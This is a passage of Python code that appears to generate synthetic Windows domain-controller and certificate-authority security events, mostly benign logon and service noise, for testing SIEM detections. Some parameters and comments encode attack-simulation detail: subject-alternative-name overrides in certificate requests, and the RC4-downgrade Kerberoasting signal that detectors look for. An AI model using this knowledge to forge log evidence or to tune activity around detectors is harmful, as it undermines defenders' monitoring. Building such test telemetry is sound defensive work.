    dns_domain = _get_dns_domain(config)
    req_id = request_id or str(random.randint(100, 99999))
    requester = f"{domain}\\{user_info['username']}"
    attrs_parts = [f"CertificateTemplate:{template_name}"]
    if san_override:
        attrs_parts.append(f"san:{san_kind}={san_override}")
    hostname = user_info.get("hostname", "WKS-TEMP")
    if "." not in hostname:
        hostname = f"{hostname}.{dns_domain}"
    attrs_parts.append(f"ccm:{hostname}")
    attrs = "\r\n".join(attrs_parts)
    event_data = {
        "RequestId":  req_id,
        "Requester":  requester,
        "Attributes": attrs,
    }
    return _build_event(4886, ca_host, event_data, success=True, ts=ts)


def _build_4887(user_info, config, *, template_name, request_id=None,
                san_override=None, san_kind="upn", subject_dn=None, ts=None) -> dict:
    """4887 – Certificate Services approved and issued a certificate (CA event)."""
    ca_host = _get_ca_hostname(config)
    domain = _get_domain(config)
    dns_domain = _get_dns_domain(config)
    req_id = request_id or str(random.randint(100, 99999))
    requester = f"{domain}\\{user_info['username']}"
    attrs_parts = [f"CertificateTemplate:{template_name}"]
    if san_override:
        attrs_parts.append(f"san:{san_kind}={san_override}")
    hostname = user_info.get("hostname", "WKS-TEMP")
    if "." not in hostname:
        hostname = f"{hostname}.{dns_domain}"
    attrs_parts.append(f"ccm:{hostname}")
    attrs = "\r\n".join(attrs_parts)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)
    subj = subject_dn or f"CN={user_info['username']}, CN=Users, {base_dn}"
    event_data = {
        "RequestId":              req_id,
        "Requester":              requester,
        "Attributes":             attrs,
        "Disposition":            "3",
        "SubjectKeyIdentifier":   _random_ski(),
        "Subject":                subj,
    }
    return _build_event(4887, ca_host, event_data, success=True, ts=ts)


def _build_4888(user_info, config, *, template_name, request_id=None,
                san_override=None, san_kind="upn", subject_dn=None, ts=None) -> dict:
    """4888 – Certificate Services denied a certificate request (CA event)."""
    ca_host = _get_ca_hostname(config)
    domain = _get_domain(config)
    dns_domain = _get_dns_domain(config)
    req_id = request_id or str(random.randint(100, 99999))
    requester = f"{domain}\\{user_info['username']}"
    attrs_parts = [f"CertificateTemplate:{template_name}"]
    if san_override:
        attrs_parts.append(f"san:{san_kind}={san_override}")
    hostname = user_info.get("hostname", "WKS-TEMP")
    if "." not in hostname:
        hostname = f"{hostname}.{dns_domain}"
    attrs_parts.append(f"ccm:{hostname}")
    attrs = "\r\n".join(attrs_parts)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)
    subj = subject_dn or f"CN={user_info['username']}, CN=Users, {base_dn}"
    event_data = {
        "RequestId":              req_id,
        "Requester":              requester,
        "Attributes":             attrs,
        "Disposition":            "2",
        "SubjectKeyIdentifier":   "",
        "Subject":                subj,
    }
    return _build_event(4888, ca_host, event_data, success=False, ts=ts)


def _dc_logon_event(user_info, config, *, logon_type=3, auth_pkg=_KRB_PACKAGE,
                    ip_override=None, logon_id=None, ts=None) -> dict:
    """Emit a 4624 on the DC matching the Kerberos/NTLM auth that just succeeded.

    Real DCs log their own 4624 (type 3) whenever they process a successful
    authentication.  SIEM correlation rules join this DC-side 4624 to the
    endpoint-side 4624 via timestamp proximity and matching TargetUserName.
    """
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    ip = ip_override if ip_override is not None else user_info.get("ip") or "-"
    logon_id = logon_id or _new_logon_id()
    dc_short = _get_dc_short(config)
    event_data = {
        "SubjectUserSid":            _SID_SYSTEM,
        "SubjectUserName":           dc_short + "$",
        "SubjectDomainName":         domain,
        "SubjectLogonId":            "0x3e7",
        "TargetUserSid":             _stable_user_sid(user_info["username"]),
        "TargetUserName":            user_info["username"],
        "TargetDomainName":          domain,
        "TargetLogonId":             logon_id,
        "LogonType":                 str(logon_type),
        "LogonProcessName":          "Kerberos" if auth_pkg == _KRB_PACKAGE else "NtLmSsp ",
        "AuthenticationPackageName": auth_pkg,
        "WorkstationName":           "-" if auth_pkg == _KRB_PACKAGE else dc_short,
        "LogonGuid":                 _new_logon_guid(),
        "TransmittedServices":       "-",
        "LmPackageName":             "-",
        "KeyLength":                 "0",
        "ProcessId":                 _LSASS_PID_HEX,
        "ProcessName":               "C:\\Windows\\System32\\lsass.exe",
        "IpAddress":                 ip if ip and ip != "-" else "-",
        "IpPort":                    str(random.randint(49152, 65535)),
        "ImpersonationLevel":        "%%1833",
        "RestrictedAdminMode":       "-",
        "TargetOutboundUserName":    "-",
        "TargetOutboundDomainName":  "-",
        "VirtualAccount":            "%%1843",
        "TargetLinkedLogonId":       "0x0",
        "ElevatedToken":             "%%1843",
    }
    return _build_event(4624, dc_host, event_data, success=True, ts=ts)


def _build_4768(user_info, config, *, ip_override=None, encryption=None,
                status="0x0", cert_issuer="", cert_serial="", cert_thumbprint="",
                preauth_type="2", ts=None) -> dict:
    """4768 – Kerberos TGT request (DC event, success=Status 0x0).

    `preauth_type` is the Windows numeric pre-authentication type. The default
    "2" is PA-ENC-TIMESTAMP (password). PKINIT is "16" (PA-PK-AS-REQ), which is
    what the "PKINIT TGT authentication request" analytic keys on; callers using
    it must also populate cert_issuer/cert_serial/cert_thumbprint.
    """
    domain = _get_domain(config)
    dc_host = _get_dc_hostname(config)
    ip = ip_override if ip_override is not None else user_info.get("ip") or "-"
    enc = encryption or random.choice(_TICKET_ENC_NORMAL)
    success = (status == "0x0")
    dns_domain_upper = _get_dns_domain(config).upper()
    svc_name = "krbtgt" if success else f"krbtgt/{dns_domain_upper}"
    enc_desc = {"0x12": "AES256-CTS-HMAC-SHA1-96", "0x11": "AES128-CTS-HMAC-SHA1-96",
                "0x17": "RC4-HMAC", "0x3": "DES-CBC-MD5"}.get(enc, enc)
    dc_supported = "0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)"
    client_enc_types = ("\n\t\tAES256-CTS-HMAC-SHA1-96\n\t\tAES128-CTS-HMAC-SHA1-96"
                        "\n\t\tRC4-HMAC-NT\n\t\tRC4-HMAC-NT-EXP\n\t\tRC4-HMAC-OLD-EXP")
    event_data = {
        "TargetUserName":                   user_info["username"],
        "TargetDomainName":                 dns_domain_upper,
        "TargetSid":                        _stable_user_sid(user_info["username"]) if success else _SID_ANON,
        "ServiceName":                      svc_name,
        "ServiceSid":                       f"{_SYNTH_DOMAIN_SID}-502" if success else _SID_ANON,
        "TicketOptions":                    "0x40810010",
        "Status":                           status,
        "TicketEncryptionType":             enc,
        "PreAuthType":                      preauth_type,
        "IpAddress":                        f"::ffff:{ip}" if ip and "." in str(ip) else ip,
        "IpPort":                           str(random.randint(49152, 65535)) if ip and ip != "-" else "0",
        "CertIssuerName":                   cert_issuer,
        "CertSerialNumber":                 cert_serial,
        "CertThumbprint":                   cert_thumbprint,
        "ResponseTicket":                   "N/A",
        "AccountSupportedEncryptionTypes":  "N/A",
        "AccountAvailableKeys":             "N/A",
        "ServiceSupportedEncryptionTypes":  dc_supported,
        "ServiceAvailableKeys":             "AES-SHA1, RC4",
        "DCSupportedEncryptionTypes":       dc_supported,
        "DCAvailableKeys":                  "AES-SHA1, RC4",
        "ClientAdvertizedEncryptionTypes":  client_enc_types,
        "SessionKeyEncryptionType":         enc,
        "PreAuthEncryptionType":            "N/A",
    }
    return _build_event(4768, dc_host, event_data, success=success, ts=ts,
)


def _build_4769(user_info, config, *, service_spn=None, encryption=None,
                status="0x0", ip_override=None, ts=None) -> dict:
    """4769 – Kerberos service-ticket request (DC event)."""
    domain = _get_domain(config)
    dc_host = _get_dc_hostname(config)
    ip = ip_override if ip_override is not None else user_info.get("ip") or "-"
    spn = service_spn or random.choice(_SERVICE_ACCOUNT_SPNS)
    enc = encryption or random.choice(_TICKET_ENC_NORMAL)
    success = (status == "0x0")
    svc_acct = _SPN_TO_SERVICE_ACCOUNT.get(spn)
    if svc_acct:
        svc_name = svc_acct
    elif spn.lower().startswith("krbtgt"):
        svc_name = "krbtgt"
    elif "/" in spn:
        svc_name = spn.split("/")[1].split(":")[0].split(".")[0].upper() + "$"
    else:
        svc_name = spn
    # Post-Jan-2025 CU (event Version 2) adds ticket-hash and per-principal encryption-capability
    # fields. We model the SERVICE as AES-capable (msds-SET includes AES), so an RC4 (0x17) service
    # ticket against it is a DOWNGRADE — the modern Kerberoasting signal the newer detectors use
    # (weak ticket enc vs. AES-capable account), independent of the legacy "0x17 only" heuristic.
    svc_supported = "0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)"
    client_adv = ("\n\t\tAES256-CTS-HMAC-SHA1-96\n\t\tAES128-CTS-HMAC-SHA1-96"
                  "\n\t\tRC4-HMAC-NT\n\t\tRC4-HMAC-NT-EXP\n\t\tRC4-HMAC-OLD-EXP")
    event_data = {
        "TargetUserName":        f"{user_info['username']}@{_get_dns_domain(config).upper()}",
        "TargetDomainName":      _get_dns_domain(config).upper(),
        "ServiceName":           svc_name,
        "ServiceSid":            _stable_user_sid(spn) if success else _SID_ANON,
        "TicketOptions":         "0x40810000",
        "TicketEncryptionType":  enc if success else "0xFFFFFFFF",
        "IpAddress":             f"::ffff:{ip}" if ip and "." in str(ip) else ip,
        "IpPort":                str(random.randint(49152, 65535)) if ip and ip != "-" else "0",
        "Status":                status,
        "LogonGuid":             _new_logon_guid(),
        "TransmittedServices":   "-",
        # --- Version 2 (Jan 2025 CU) fields ---
        "RequestTicketHash":     _ticket_hash() if success else "N/A",
        "ResponseTicketHash":    _ticket_hash() if success else "N/A",
        "AccountSupportedEncryptionTypes": "N/A",
        "AccountAvailableKeys":  "N/A",
        "ServiceSupportedEncryptionTypes": svc_supported if success else "N/A",
        "ServiceAvailableKeys":  "AES-SHA1, RC4" if success else "N/A",
        "DCSupportedEncryptionTypes": "0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)",
        "DCAvailableKeys":       "AES-SHA1, RC4",
        "ClientAdvertizedEncryptionTypes": client_adv,
        # modern DCs issue an AES session key even when the service ticket itself is RC4
        "SessionKeyEncryptionType": "0x12" if success else "0xFFFFFFFF",
    }
    return _build_event(4769, dc_host, event_data, success=success, ts=ts,
)


def _build_4771(user_info, config, *, status="0x18", ip_override=None, ts=None) -> dict:
    """4771 – Kerberos pre-authentication failed (DC event, failure only)."""
    dc_host = _get_dc_hostname(config)
    ip = ip_override if ip_override is not None else user_info.get("ip") or "-"
    event_data = {
        "TargetUserName":        user_info["username"],
        "TargetSid":             _stable_user_sid(user_info["username"]),
        "ServiceName":           f"krbtgt/{_get_dns_domain(config).upper()}",
        "TicketOptions":         "0x40810010",
        "Status":                status,
        "PreAuthType":           "2",
        "IpAddress":             f"::ffff:{ip}" if ip and "." in str(ip) else ip,
        "IpPort":                str(random.randint(49152, 65535)),
        "CertIssuerName":        "",
        "CertSerialNumber":      "",
        "CertThumbprint":        "",
    }
    with _STATE_LOCK:
        _FAIL_COUNTS[user_info["username"]] = _FAIL_COUNTS.get(user_info["username"], 0) + 1
    return _build_event(4771, dc_host, event_data, success=False, ts=ts,
)


def _build_4776(user_info, config, *, status="0x0", workstation=None, ts=None) -> dict:
    """4776 – NTLM credential validation (DC event)."""
    dc_host = _get_dc_hostname(config)
    ws = (workstation or user_info.get("hostname") or "UNKNOWN").split(".")[0].upper()
    success = (status == "0x0")
    event_data = {
        "PackageName":     _NTLM_PACKAGE,
        "TargetUserName":  user_info["username"],
        "Workstation":     ws,
        "Status":          status,
    }
    return _build_event(4776, dc_host, event_data, success=success, ts=ts,
)


# UAC value constants for 4720/4722/4738
# WARNING: these are LDAP userAccountControl values. Event 4738's OldUacValue/NewUacValue
# fields are SAM USER_ACCOUNT flags ([MS-SAMR]), a DIFFERENT bitmask — there
# USER_NORMAL_ACCOUNT is 0x10 and USER_DONT_EXPIRE_PASSWORD is 0x200. Passing the LDAP
# constants into a 4738 emits a change that contradicts the %%-token beside it, which
# defeats the intended detector. Use SAM literals
# for 4738; these constants are correct for LDAP-facing events such as 4720.
_UAC_NORMAL_ACCOUNT        = "0x200"     # 512: normal user account (LDAP)
_UAC_ACCOUNTDISABLE        = "0x202"     # 514: disabled + normal
_UAC_DONT_EXPIRE_PASSWD    = "0x10200"   # 66048: normal + DONT_EXPIRE_PASSWORD
_UAC_PASSWD_NOTREQD        = "0x220"     # 544: PASSWD_NOTREQD + normal

_DEFAULT_LOCAL_ACCOUNTS = ["Administrator", "Guest", "DefaultAccount", "WDAGUtilityAccount"]


def _build_4720(user_info, config, *, target_username, target_sid,
                sam_account_name=None, display_name="-", upn="-",
                new_uac_value=_UAC_ACCOUNTDISABLE, logon_id=None,
                ts=None) -> dict:
    """4720 – A user account was created (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "TargetUserName":      target_username,
        "TargetDomainName":    domain,
        "TargetSid":           target_sid,
        "SubjectUserSid":      _stable_user_sid(user_info["username"]),
        "SubjectUserName":     user_info["username"],
        "SubjectDomainName":   domain,
        "SubjectLogonId":      logon_id or _new_logon_id(),
        "PrivilegeList":       "-",
        "SamAccountName":      sam_account_name or target_username,
        "DisplayName":         display_name,
        "UserPrincipalName":   upn,
        "HomeDirectory":       "-",
        "HomePath":            "-",
        "ScriptPath":          "-",
        "ProfilePath":         "-",
        "UserWorkstations":    "-",
        "PasswordLastSet":     _iso_ts(ts),
        "AccountExpires":      "%%1794",
        "PrimaryGroupId":      "513",
        "AllowedToDelegateTo": "-",
        "OldUacValue":         "0x0",
        "NewUacValue":         new_uac_value,
        "UserAccountControl":  "%%2080\r\n\t\t%%2082" if new_uac_value == _UAC_ACCOUNTDISABLE else "%%2080",
        "UserParameters":      "-",
        "SidHistory":          "-",
        "LogonHours":          "%%1793",
    }
    return _build_event(4720, dc_host, event_data, success=True, ts=ts)


def _build_4722(user_info, config, *, target_username, target_sid,
                logon_id=None, ts=None) -> dict:
    """4722 – A user account was enabled (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "TargetUserName":    target_username,
        "TargetDomainName":  domain,
        "TargetSid":         target_sid,
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
    }
    return _build_event(4722, dc_host, event_data, success=True, ts=ts)


def _build_4725(user_info, config, *, target_username, target_sid,
                logon_id=None, ts=None) -> dict:
    """4725 – A user account was disabled (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "TargetUserName":    target_username,
        "TargetDomainName":  domain,
        "TargetSid":         target_sid,
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
    }
    return _build_event(4725, dc_host, event_data, success=True, ts=ts)


def _build_4724(user_info, config, *, target_username, target_sid,
                logon_id=None, ts=None) -> dict:
    """4724 – An attempt was made to reset an account's password (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "TargetUserName":    target_username,
        "TargetDomainName":  domain,
        "TargetSid":         target_sid,
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
    }
    return _build_event(4724, dc_host, event_data, success=True, ts=ts)


def _build_4726(user_info, config, *, target_username, target_sid,
                logon_id=None, ts=None) -> dict:
    """4726 – A user account was deleted (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "TargetUserName":    target_username,
        "TargetDomainName":  domain,
        "TargetSid":         target_sid,
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
        "PrivilegeList":     "-",
    }
    return _build_event(4726, dc_host, event_data, success=True, ts=ts)


def _build_4738(user_info, config, *, target_username, target_sid,
                sam_account_name=None, old_uac_value=_UAC_NORMAL_ACCOUNT,
                new_uac_value=_UAC_NORMAL_ACCOUNT, uac_control="-",
                allowed_to_delegate="-", sid_history="-",
                logon_id=None, ts=None) -> dict:
    """4738 – A user account was changed (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "Dummy":               "-",
        "TargetUserName":      target_username,
        "TargetDomainName":    domain,
        "TargetSid":           target_sid,
        "SubjectUserSid":      _stable_user_sid(user_info["username"]),
        "SubjectUserName":     user_info["username"],
        "SubjectDomainName":   domain,
        "SubjectLogonId":      logon_id or _new_logon_id(),
        "PrivilegeList":       "-",
        "SamAccountName":      sam_account_name or target_username,
        "DisplayName":         "-",
        "UserPrincipalName":   "-",
        "HomeDirectory":       "-",
        "HomePath":            "-",
        "ScriptPath":          "-",
        "ProfilePath":         "-",
        "UserWorkstations":    "-",
        "PasswordLastSet":     "-",
        "AccountExpires":      "-",
        "PrimaryGroupId":      "-",
        "AllowedToDelegateTo": allowed_to_delegate,
        "OldUacValue":         old_uac_value,
        "NewUacValue":         new_uac_value,
        "UserAccountControl":  uac_control,
        "UserParameters":      "-",
        "SidHistory":          sid_history,
        "LogonHours":          "-",
    }
    return _build_event(4738, dc_host, event_data, success=True, ts=ts)


# Benign event generators

def _benign_interactive_logon(config, session_context):
    """User logs on interactively at their workstation (LogonType 2).
    Produces: DC 4768 + DC 4624 + endpoint 4624 + optional 4672.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None
    _publish_logon(u)   # session start -> cloud sign-in + network traffic for this user correlate

    t0 = time.time()
    logon_id = _new_logon_id()
    is_admin = random.random() < 0.15
    result = []
    result.append(json.dumps(_build_4768(u, config, ts=t0 - random.uniform(2.0, 4.0))))
    result.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t0 - random.uniform(0.8, 1.5))))
    result.append(json.dumps(_build_4624(u, config, logon_type=2, auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id, elevated=is_admin, ts=t0)))
    if is_admin:
        result.append(json.dumps(_build_4672(u, config, logon_id=logon_id, ts=t0 + 0.05)))
    return result


def _benign_network_share_logon(config, session_context):
    """User's workstation accesses a file share (LogonType 3, Kerberos).
    Produces: DC 4769 TGS + DC 4624 + server-side 4624.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None
    server_spns = [s for s in _SERVICE_ACCOUNT_SPNS if s.startswith("cifs/")]
    spn = random.choice(server_spns or _SERVICE_ACCOUNT_SPNS)
    server_fqdn = spn.split("/")[1].split(":")[0]
    if "." not in server_fqdn:
        server_fqdn = f"{server_fqdn}.{_get_dns_domain(config)}"

    t0 = time.time()
    logon_id = _new_logon_id()
    result = []
    result.append(json.dumps(_build_4769(u, config, service_spn=spn, ts=t0 - random.uniform(2.0, 3.5))))
    result.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t0 - random.uniform(0.8, 1.5))))
    result.append(json.dumps(_build_4624(u, config, logon_type=3, auth_pkg=_KRB_PACKAGE,
                                         workstation_override=server_fqdn,
                                         target_logon_id=logon_id, ts=t0)))
    # Server-side share audit for the same logon session: 5140 once per share
    # connection, and a 5145 for the file opened when Detailed File Share is audited.
    share, path, files = random.choice(_server_shares(server_fqdn))
    t1 = t0 + random.uniform(0.02, 0.2)
    result.append(json.dumps(_build_5140(u, config, computer=server_fqdn, share_name=share,
                                         share_path=path, logon_id=logon_id, ts=t1)))
    if random.random() < 0.35:
        result.append(json.dumps(_build_5145(
            u, config, computer=server_fqdn, share_name=share, share_path=path,
            relative_target=random.choice(files), logon_id=logon_id,
            ts=t1 + random.uniform(0.05, 2.0))))
    return result


# Shares per file server (UNC share name, local path, typical relative targets).
_FILE_SERVER_SHARES = {
    "fs": [
        (r"\\*\Shared",      r"\??\D:\Shares\Shared",
         [r"Finance\Q3 Forecast.xlsx", r"HR\Benefits 2026.pdf", r"Projects\Roadmap.pptx",
          r"Templates\Letterhead.dotx", r"IT\Install\README.txt"]),
        (r"\\*\Departments", r"\??\D:\Shares\Departments",
         [r"Sales\Pipeline.xlsx", r"Marketing\Brand Guide.pdf", r"Legal\NDA Template.docx"]),
        (r"\\*\Home$",       r"\??\D:\Home",
         [r"Documents\notes.txt", r"Desktop\todo.docx", "desktop.ini"]),
    ],
    "backup": [
        (r"\\*\Backups",     r"\??\E:\Backups",
         [r"Daily\catalog.xml", r"Weekly\manifest.json"]),
    ],
}


def _server_shares(server_fqdn):
    short = server_fqdn.split(".")[0].lower()
    return _FILE_SERVER_SHARES["backup" if short.startswith("backup") else "fs"]


# Software that registers its own scheduled tasks / services as part of routine
# install and self-update. (task name, command, arguments, trigger)
_BENIGN_SCHED_TASKS = [
    (r"\GoogleSystem\GoogleUpdater\GoogleUpdaterTaskSystem{ver}",
     r"C:\Program Files (x86)\Google\GoogleUpdater\{ver}\updater.exe", "--wake --system", "daily"),
    (r"\MicrosoftEdgeUpdateTaskMachineCore{{{guid}}}",
     r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe", "/c", "logon"),
    (r"\MicrosoftEdgeUpdateTaskMachineUA{{{guid}}}",
     r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe", "/ua /installsource scheduler", "daily"),
    (r"\Adobe Acrobat Update Task",
     r"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe", "", "logon"),
    (r"\Mozilla\Firefox Default Browser Agent {hex}",
     r"C:\Program Files\Mozilla Firefox\default-browser-agent.exe", "do-task \"{hex}\"", "daily"),
    (r"\Microsoft\Office\Office Automatic Updates 2.0",
     r"C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeC2RClient.exe",
     "/frequentupdate SCHEDULEDTASK displaylevel=False", "daily"),
]

_BENIGN_SERVICES = [
    ("GoogleUpdaterService{ver}", r'"C:\Program Files (x86)\Google\GoogleUpdater\{ver}\updater.exe" --system --windows-service', 2),
    ("edgeupdate",  r'"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc', 2),
    ("edgeupdatem", r'"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc', 3),
    ("MozillaMaintenance", r'"C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"', 3),
    ("ZoomCptService", r'"C:\Program Files\Common Files\Zoom\Support\CptService.exe" -user_path "C:\Users\Public"', 3),
    ("AdobeARMservice", r'"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe"', 2),
]


_UPDATER_VERSIONS = ["128.0.6537.0", "129.0.6668.0", "130.0.6723.0"]


def _software_tokens(host):
    """The token set of one host's installs, so a task/service name and its binary path
    agree. The Edge task GUID and the Firefox install hash are fixed per machine in
    reality -- drawn per call they made every re-registration a new, never-seen task
    name. The updater version steps forward every two weeks, staggered per host."""
    h = int(hashlib.sha256(f"sw:{host.lower()}".encode()).hexdigest(), 16)
    fortnight = int(time.time() // (14 * 86400))
    tok = {"{ver}": _UPDATER_VERSIONS[(h + fortnight) % len(_UPDATER_VERSIONS)],
           "{guid}": str(uuid.UUID(int=h >> 128)).upper(),
           "{hex}": f"{h & ((1 << 64) - 1):016X}"}

    def fill(s):
        for k, v in tok.items():
            s = s.replace(k, v)
        return s
    return fill


def _benign_scheduled_task_create(config, session_context):
    """Software updater registers its scheduled task (4698, Subject = SYSTEM machine
    account during an elevated installer run)."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    name, cmd, args, trig = random.choice(_BENIGN_SCHED_TASKS)
    fill = _software_tokens(u["hostname"])
    machine = {**u, "username": u["hostname"].split(".")[0].upper() + "$"}
    return json.dumps(_build_4698(machine, config, task_name=fill(name), command=fill(cmd),
                                  arguments=fill(args),
                                  author=f"{_get_domain(config)}\\{u['username']}",
                                  trigger=trig, logon_id="0x3e7"))


def _benign_service_install(config, session_context):
    """Software installer registers a Windows service (4697 Security + 7045 System)."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    name, image, start = random.choice(_BENIGN_SERVICES)
    fill = _software_tokens(u["hostname"])
    name, image = fill(name), fill(image)
    t = time.time()
    return [json.dumps(_build_4697(config, computer=u["hostname"], service_name=name,
                                   service_file=image, start_type=start, ts=t)),
            json.dumps(_build_7045(config, computer=u["hostname"], service_name=name,
                                   image_path=image, start_type=start, ts=t + 0.01))]


def _benign_workstation_unlock(config, session_context):
    """User unlocks their screen (LogonType 7)."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    _publish_logon(u)
    return json.dumps(_build_4624(u, config, logon_type=7, auth_pkg=_NEG_PACKAGE))


def _benign_logoff(config, session_context):
    """Close an existing open session with a 4634 or 4647.
    This is the only generator that mutates _OPEN_SESSIONS.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None
    # Find an open session for the user's hostname — only emit logoff if
    # one exists AND it has been open long enough (5+ minutes) to be realistic.
    session = _pop_open_session(u["hostname"], u["username"])
    if not session:
        # No open session for this user — fall back to any other open session
        # on the same host (matches real behaviour: system-initiated logoffs).
        session = _pop_open_session(u["hostname"])
    if not session:
        # Nothing open → skip; logoff without matching logon is forbidden.
        return None

    age = time.time() - session["start"]
    if age < 300:  # < 5 min
        # Put the session back; it's too fresh to be logged off realistically.
        with _STATE_LOCK:
            _OPEN_SESSIONS.setdefault(u["hostname"], []).append(session)
        return None

    # Interactive logons → 4647 (user-initiated) + a trailing 4634
    # Non-interactive → just 4634
    if session["logon_type"] in (2, 10, 11):
        t0 = time.time()
        e1 = _build_4647(session, config, ts=t0)
        e2 = _build_4634(session, config, ts=t0 + 0.2)
        return [json.dumps(e1), json.dumps(e2)]
    else:
        return json.dumps(_build_4634(session, config))


def _benign_service_logon(config, session_context):
    """A service account logon (LogonType 5) — always gets 4672 privileges."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    svc_name = random.choice(_SERVICE_ACCOUNT_SAMS)
    fake_user = {**u, "username": svc_name}
    logon_id = _new_logon_id()
    t = time.time()
    logon = _build_4624(fake_user, config, logon_type=5, auth_pkg=_NEG_PACKAGE,
                        target_logon_id=logon_id, ts=t)
    priv = _build_4672(fake_user, config, logon_id=logon_id, is_service=True,
                       ts=t + 0.01)
    return [json.dumps(logon), json.dumps(priv)]


def _benign_dc_self_logon(config, session_context):
    """DC self-authentication — the background noise DCs constantly generate.

    Produces a mix of:
      - Type 5 service logon (svchost.exe starting a service as SYSTEM/machine acct)
      - Type 7 unlock (admin unlocking DC console)
      - Self-TGT request (DC's machine account requesting its own krbtgt)
    """
    dc_host = _get_dc_hostname(config)
    dc_short = _get_dc_short(config)
    domain = _get_domain(config)
    dc_machine_acct = dc_short + "$"
    dc_user = {
        "username": dc_machine_acct,
        "hostname": dc_host,
        "ip": "127.0.0.1",
    }
    events = []
    t = time.time()

    scenario = random.choices(
        ["service", "unlock", "tgt"],
        weights=[50, 20, 30], k=1)[0]

    if scenario == "service":
        svc = random.choice(_SERVICE_ACCOUNT_SAMS + [dc_machine_acct, "SYSTEM"])
        svc_user = {**dc_user, "username": svc}
        events.append(json.dumps(
            _build_4624(svc_user, config, logon_type=5,
                        auth_pkg=_NEG_PACKAGE,
                        workstation_override=dc_host,
                        ip_override="-", ts=t)))
    elif scenario == "unlock":
        admin_user = {**dc_user, "username": "Administrator"}
        events.append(json.dumps(
            _build_4624(admin_user, config, logon_type=7,
                        auth_pkg=_NEG_PACKAGE,
                        workstation_override=dc_host,
                        ip_override="127.0.0.1", ts=t)))
    else:
        events.append(json.dumps(
            _build_4768(dc_user, config,
                        ip_override="::1", ts=t)))

    return events


def _benign_scheduled_task_logon(config, session_context):
    """Scheduled task fires (LogonType 4 – Batch)."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    return json.dumps(_build_4624(u, config, logon_type=4, auth_pkg=_NEG_PACKAGE))


def _benign_cached_logon(config, session_context):
    """Laptop offline, uses cached creds (LogonType 11)."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    _publish_logon(u)
    return json.dumps(_build_4624(u, config, logon_type=11, auth_pkg=_NEG_PACKAGE))


def _benign_rdp_logon(config, session_context):
    """Benign RDP into user's machine from another internal host (LogonType 10).
    Produces: DC 4769 TGS + DC 4624 + endpoint 4624 + optional 4672.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None
    if _focus_user():
        return None     # Bad User: the session comes from another host, not the target's computer
    _publish_logon(u)
    src = _pick_windows_user(session_context)
    src_ip = src["ip"] if src and src["ip"] != u["ip"] else "10.10.10.200"

    t0 = time.time()
    logon_id = _new_logon_id()
    is_admin = random.random() < 0.3
    result = []
    result.append(json.dumps(_build_4769(u, config, service_spn=f"TERMSRV/{u['hostname']}", ts=t0 - random.uniform(2.0, 3.5))))
    result.append(json.dumps(_dc_logon_event(u, config, ip_override=src_ip,
                                             logon_id=logon_id, ts=t0 - random.uniform(0.8, 1.5))))
    result.append(json.dumps(_build_4624(u, config, logon_type=10, auth_pkg=_KRB_PACKAGE,
                                         ip_override=src_ip, target_logon_id=logon_id,
                                         elevated=is_admin, ts=t0)))
    if is_admin:
        result.append(json.dumps(_build_4672(u, config, logon_id=logon_id, ts=t0 + 0.05)))
    return result


def _benign_sql_access(config, session_context):
    """User connects to SQL Server — 4769 TGS for MSSQLSvc SPN with AES."""
    u = _pick_windows_user_corr(session_context)
    if not u:
        return None
    sql_spns = [s for s in _SERVICE_ACCOUNT_SPNS if s.startswith("MSSQLSvc/")]
    spn = random.choice(sql_spns)
    return json.dumps(_build_4769(u, config, service_spn=spn, encryption="0x12"))


def _benign_web_app_access(config, session_context):
    """User accesses intranet web app — 4769 TGS for HTTP SPN with AES."""
    u = _pick_windows_user_corr(session_context)
    if not u:
        return None
